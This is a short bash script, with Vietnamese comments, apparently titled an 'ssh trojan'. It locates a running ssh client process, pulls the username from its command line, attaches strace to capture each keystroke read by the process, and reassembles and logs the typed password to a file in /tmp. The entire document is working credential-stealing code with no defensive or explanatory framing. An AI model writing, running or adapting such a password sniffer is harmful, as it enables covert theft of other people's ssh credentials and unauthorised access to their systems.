#!/bin/bash
logfile="/tmp/log_sshtrojan2.txt"
username=""
password=""
echo "Time: " `date` >> $logfile

# Tim pid cua ssh
pid=`ps ax | grep -w ssh | grep @  | head -n1 | awk '{ print $1}'`
# Lay username
username=`ps ax | grep ssh | grep @ |head -n1 | awk ' {print $6} ' | cut -d'@' -f1`
echo "Username: " $username >> $logfile

# Su dung strace de lay password
strace -f -p $pid -e trace=read --status=successful 2>&1 | while read -r line; do
	if [[ $line == *'read(4, "'* && $line == *' = 1' ]]; then
		char=`echo $line | cut -d'"' -f2 | cut -d'"' -f1`
		if [[ $char == "\\n" || $char == "\\r" ]]; then
			if ! [[ -z "$password" ]]; then
				echo "Password: " $password >> $logfile
				password=""
			fi
		elif [[ $char =~ ^.{1}$ ]];then
			password=$(echo $password$char)
		
		fi
	fi
done;

